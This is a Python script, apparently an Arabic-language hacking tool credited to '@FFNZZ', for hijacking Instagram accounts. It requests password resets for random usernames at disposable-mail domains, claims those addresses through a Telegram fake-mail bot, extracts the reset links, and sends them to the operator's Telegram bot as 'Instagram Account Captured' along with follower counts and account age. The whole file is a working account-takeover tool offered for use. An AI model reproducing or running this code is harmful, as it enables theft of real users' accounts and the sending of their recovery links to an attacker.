from threading import Thread
from telethon.sync import TelegramClient
import time
import random
import requests
import os
import re
import shutil
import pytz
import datetime
import sys
import re
import datetime
import hashlib
import uuid
import json

import os

try:
    import httpx
    import user_agent
except:
    os.system("pip install httpx httpx[http2] user_agent")
    import httpx
    import user_agent
  
def send_instagram_password_reset(username_or_email):
    headers = {
    "user-agent": user_agent.generate_user_agent(),
    "x-ig-app-id": "936619743392459",
    "x-requested-with": "XMLHttpRequest",
    "x-instagram-ajax": "1032099486",
    "x-csrftoken": "missing",
    "x-asbd-id": "359341",
    "origin": "https://www.instagram.com",
    "referer": "https://www.instagram.com/accounts/password/reset/",
    "accept-language": "en-US",
    "priority": "u=1, i",
}



    try:
        r = httpx.Client(http2=True, headers=headers, timeout=20).post("https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", data={"email_or_username": username_or_email}).json()
        if r.get("status")=='ok':
            return True, ""
        else:
            return False, ""
    except Exception as e:
        return False, ""

def extract_reset_link(email_text):
    match = re.search(r"https://instagram\.com/accounts/password/reset/confirm/[^\s\"']+", email_text)
    return match.group(0) if match else None

def extract_username(text):
    pattern = r"(?:مرحبًا|Hi|سلام|Hola|Hai|こんにちは)\s+[^A-Za-z0-9]*([A-Za-z0-9._]+)"
    match = re.search(pattern, text)
    return match.group(1) if match else None

def get_user_info_from_instagram(username):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }
        
        url = f"https://www.instagram.com/{username}/"
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            content = response.text
            
            try:
                shared_data_match = re.search(r'window\._sharedData\s*=\s*({.*?});', content)
                if shared_data_match:
                    shared_data = json.loads(shared_data_match.group(1))
                    user_data = shared_data.get('entry_data', {}).get('ProfilePage', [{}])[0].get('graphql', {}).get('user', {})
                    
                    followers = user_data.get('edge_followed_by', {}).get('count', 0)
                    following = user_data.get('edge_follow', {}).get('count', 0)
                    
                    return followers, following
            except:
                pass
            
            followers_match = re.search(r'"edge_followed_by":\s*{"count":\s*(\d+)}', content)
            following_match = re.search(r'"edge_follow":\s*{"count":\s*(\d+)}', content)
            
            if followers_match and following_match:
                followers = int(followers_match.group(1))
                following = int(following_match.group(1))
                return followers, following
                
            meta_followers = re.search(r'content="([\d,]+)\s+Followers"', content)
            meta_following = re.search(r'content="([\d,]+)\s+Following"', content)
            
            if meta_followers and meta_following:
                followers = int(meta_followers.group(1).replace(',', ''))
                following = int(meta_following.group(1).replace(',', ''))
                return followers, following
                
        return 0, 0
        
    except Exception as e:
        return 0, 0

def get_user_info_api(username):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-IG-App-ID': '936619743392459'
        }
        
        url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            user_data = data.get('data', {}).get('user', {})
            
            followers = user_data.get('edge_followed_by', {}).get('count', 0)
            following = user_data.get('edge_follow', {}).get('count', 0)
            
            return followers, following
        else:
            return 0, 0
            
    except Exception as e:
        return 0, 0

def get_followers_following(username):
    followers, following = get_user_info_api(username)
    
    if followers == 0 and following == 0:
        followers, following = get_user_info_from_instagram(username)
    
    return followers, following

def estimate_account_year(user_id):
    try:
        id_int = int(user_id)
        
        if id_int < 1000000:
            return 2010
        elif id_int < 10000000:
            return 2011
        elif id_int < 100000000:
            return 2012
        elif id_int < 500000000:
            return 2013
        elif id_int < 1500000000:
            return 2014
        elif id_int < 3000000000:
            return 2015
        elif id_int < 5000000000:
            return 2016
        elif id_int < 8000000000:
            return 2017
        elif id_int < 12000000000:
            return 2018
        elif id_int < 20000000000:
            return 2019
        elif id_int < 30000000000:
            return 2020
        elif id_int < 45000000000:
            return 2021
        elif id_int < 65000000000:
            return 2022
        else:
            return 2023
    except:
        return "غير معروف"

def send_to_telegram(token, chat_id, username, reset_link, followers_count, following_count, account_year):
    try:
        message_markdown = f'''
Instagram Account Captured
================================
Username: `{username}`
Followers: {followers_count if followers_count > 0 else "N/A"}
Following: {following_count if following_count > 0 else "N/A"}
Account Year: {account_year}
Reset Link: {reset_link}
Profile: https://www.instagram.com/{username}
Time: {time.strftime("%Y-%m-%d %H:%M:%S")}
================================
Developer:@FFNZZ
================================
'''
        
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        
        data_markdown = {
            "chat_id": chat_id,
            "text": message_markdown,
            "parse_mode": "Markdown"
        }
        
        response = requests.post(url, data=data_markdown)
        
        if response.status_code == 200:
            print("✅ تم إرسال الرسالة إلى التيليجرام بنجاح (مع Markdown)")
            return True
        else:
            print("⚠️ فشل الإرسال مع Markdown، جاري المحاولة بدون Markdown...")
            
            message_plain = f'''
Instagram Account Captured
================================
Username: {username}
Followers: {followers_count if followers_count > 0 else "N/A"}
Following: {following_count if following_count > 0 else "N/A"}
Account Year: {account_year}
Reset Link: {reset_link}
Profile: https://www.instagram.com/{username}
Time: {time.strftime("%Y-%m-%d %H:%M:%S")}
================================
Developer: @FFNZZ
================================
'''
            
            data_plain = {
                "chat_id": chat_id,
                "text": message_plain
            }
            
            response_plain = requests.post(url, data=data_plain)
            
            if response_plain.status_code == 200:
                print("✅ تم إرسال الرسالة إلى التيليجرام بنجاح (بدون Markdown)")
                return True
            else:
                print(f"⚠️ فشل الإرسال إلى التيليجرام حتى بدون Markdown (سيتم التخطي)")
                print(f"   كود الخطأ: {response_plain.status_code}")
                return False
                
    except Exception as e:
        print(f"⚠️ خطأ في إرسال التيليجرام (سيتم التخطي): {e}")
        return False

def get_user_id_from_instagram(username):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-IG-App-ID': '936619743392459'
        }
        
        url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            user_id = data.get('data', {}).get('user', {}).get('id', '0')
            return user_id
        return '0'
    except:
        return '0'

bi=0
hi=0
gi=0
bm=0

def check(email, TOKEN, CHAT_ID, API_ID, API_HASH):
    global hi,bm,gi,bi
    EMAIL=email
    BOT = '@fakemailbot'  
    BAD_PHRASE = "This email address already taken by someone else."
    GOOD_SUBSTR = "Your new fake mail id is"

    client = TelegramClient('session', API_ID, API_HASH)
    client.start()

    sent_msg = client.send_message(BOT, EMAIL)
    sent_id = getattr(sent_msg, 'id', None)

    if not sent_id:
        client.disconnect()
        return

    timeout = 20
    deadline = time.time() + timeout
    found = False
    got_good_email = False

    while time.time() < deadline:
        msgs = client.get_messages(BOT, limit=8)  
        for m in msgs:
            if not getattr(m, 'out', False) and getattr(m, 'id', 0) > sent_id:
                text = (m.text or "").strip()
                if text == BAD_PHRASE:
                    bm+=1
                    found = True
                    break
                elif GOOD_SUBSTR in text:
                    hi+=1
                    print(f"\033[92mgood email : {EMAIL}\033[0m")
                    got_good_email = True
                    found = True
                    break
                else:
                    found = True
                    break
        
        if found:
            break
        time.sleep(1)

    if got_good_email:
        is_verified, message = send_instagram_password_reset(EMAIL)
        
        if is_verified:
            print(f"\033[92mالحساب مؤكد: {EMAIL}\033[0m")
            gi += 1
            
            reset_timeout = 30
            reset_deadline = time.time() + reset_timeout
            reset_found = False
            
            last_msgs = client.get_messages(BOT, limit=5)
            if last_msgs:
                start_msg_id = max([m.id for m in last_msgs])
            else:
                start_msg_id = sent_id
            
            while time.time() < reset_deadline:
                reset_msgs = client.get_messages(BOT, limit=15)
                for mm in reset_msgs:
                    if getattr(mm, 'id', 0) <= start_msg_id:
                        continue
                    
                    mail_text = mm.text or ""
                    
                    if not getattr(mm, 'out', False):
                        if "instagram.com/accounts/password/reset" in mail_text:
                            reset_link = extract_reset_link(mail_text)
                            username = extract_username(mail_text)
                            
                            print("\n" + "="*50)
                            print(f"\033[92m تم العثور على رسالة الريست!\033[0m")
                            print(f" Username: {username if username else '??'}")
                            print(f" Reset Link: {reset_link if reset_link else 'NOT FOUND'}")
                            print("="*50 + "\n")
                            
                            if reset_link and username:
                                followers_count, following_count = get_followers_following(username)
                                print(f"عدد المتابعين: {followers_count}")
                                print(f"عدد المتابَعين: {following_count}")
                                
                                user_id = get_user_id_from_instagram(username)
                                account_year = estimate_account_year(user_id)
                                print(f"سنة إنشاء الحساب: {account_year}")
                                
                                send_to_telegram(TOKEN, CHAT_ID, username, reset_link, followers_count, following_count, account_year)
                            
                            reset_found = True
                            break
                
                if reset_found:
                    break
                time.sleep(2)
            
            if not reset_found:
                print("\033[93mلم يتم العثور على رسالة الريست خلال المهلة\033[0m")
            
            time.sleep(10)
        else:
            bi += 1

    if not found:
        pass

    client.disconnect()
    update_stats()

def update_stats():
    tt = f'''
    \033[94mhits\033[0m : \033[92m{hi}\033[0m | \033[91mbad email\033[0m : {bm} | \033[93mbad ig\033[0m : {bi} | \033[96mgood ig\033[0m : {gi}
    '''
    print(tt)

def rzst(user, TOKEN, CHAT_ID, API_ID, API_HASH):
    global bi,bm,hi,gi
    try:
        email=user+random.choice(['@telegmail.com','@hi2.in'])
        is_verified, message = send_instagram_password_reset(email)
        
        update_stats()

        if is_verified:
            gi+=1
            check(email, TOKEN, CHAT_ID, API_ID, API_HASH)
        else:
            bi+=1

    except Exception as e:
        pass

def rest(user, TOKEN, CHAT_ID, API_ID, API_HASH):
    global bi,bm,hi,gi
    try:
        email=user+'@hi2.in'
        is_verified, message = send_instagram_password_reset(email)
        
        update_stats()

        if is_verified:
            gi+=1
            check(email, TOKEN, CHAT_ID, API_ID, API_HASH)
        else:
            bi+=1

    except Exception as e:
        pass

def rz(user, TOKEN, CHAT_ID, API_ID, API_HASH):
    global bi,bm,hi,gi
    try:
        email=user+random.choice(['@telegmail.com','@hi2.in'])
        is_verified, message = send_instagram_password_reset(email)
        
        update_stats()

        if is_verified:
            gi+=1
            check(email, TOKEN, CHAT_ID, API_ID, API_HASH)
        else:
            bi+=1

    except Exception as e:
        pass

def load_credentials():
    try:
        with open("apiid.txt", "r") as f:
            API_ID = f.read().strip()
    except:
        API_ID = input("Enter API ID: ").strip()
        with open("apiid.txt", "w") as f:
            f.write(API_ID)
    
    try:
        with open("apihash.txt", "r") as f:
            API_HASH = f.read().strip()
    except:
        API_HASH = input("Enter API HASH: ").strip()
        with open("apihash.txt", "w") as f:
            f.write(API_HASH)
    
    try:
        with open("tokeeen.txt", "r") as f:
            TOKEN = f.read().strip()
    except:
        TOKEN = input("Enter Bot Token: ").strip()
        with open("tokeeen.txt", "w") as f:
            f.write(TOKEN)
    
    try:
        with open("idee.txt", "r") as f:
            CHAT_ID = f.read().strip()
    except:
        CHAT_ID = input("Enter Telegram Chat ID: ").strip()
        with open("idee.txt", "w") as f:
            f.write(CHAT_ID)
    
    return API_ID, API_HASH, TOKEN, CHAT_ID

def dele():
    targets = ['apiid.txt', 'apihash.txt', 'session.session', 'tokeeen.txt', 'idee.txt']
    deleted = []
    not_found = []
    errors = []

    for path in targets:
        try:
            if os.path.exists(path):
                if os.path.isfile(path) or os.path.islink(path):
                    os.remove(path)
                elif os.path.isdir(path):
                    shutil.rmtree(path)
                deleted.append(path)
            else:
                not_found.append(path)
        except Exception as e:
            errors.append((path, str(e)))

    for p in deleted:
        print(f" - Deleted: {p}")
    for p in not_found:
        print(f" - Not found: {p}")
    for p, err in errors:
        print(f" - Error deleting {p}: {err}")

def qcq():
    API_ID, API_HASH, TOKEN, CHAT_ID = load_credentials()
    
    memo = random.randint(100, 300)
    O = f'\x1b[38;5;{memo}m'
    print('''
  \033[96mwelcom to fakemail tool\033[0m .
  \033[90m------------------------------\033[0m
  \033[92m1\033[0m - hi2.in mail .
  \033[92m2\033[0m - telegmail.com mail .
  \033[92m3\033[0m - both of emails .
  \033[91m4\033[0m - delete config files .
  \033[90m------------------------------\033[0m
  ''')
    
    aj=int(input('\033[93menter choice : \033[0m'))
    
    if aj==1:
        ad=int(input('\033[93mضع هنا عدد حروف اليوزر :\033[0m'))
        while True:
            u="".join(random.choice('poiuytrewqlkjhgfdsamnbvcxz')for x in range(ad))
            rest(u, TOKEN, CHAT_ID, API_ID, API_HASH)      
    
    elif aj==2:
        an=int(input('\033[93mضع هنا عدد حروف اليوزر :\033[0m'))
        while True:
            u="".join(random.choice('poiuytrewqlkjhgfdsamnbvcxz')for x in range(an))
            rzst(u, TOKEN, CHAT_ID, API_ID, API_HASH)
    
    elif aj==3:
        an=int(input('\033[93mضع هنا عدد حروف اليوزر :\033[0m'))
        while True:
            u="".join(random.choice('poiuytrewqlkjhgfdsamnbvcxz')for x in range(an))
            rz(u, TOKEN, CHAT_ID, API_ID, API_HASH)
    
    elif aj==4:
        dele()       
    else:
        print('\033[91mbad choice\033[0m')
        qcq()

qcq()
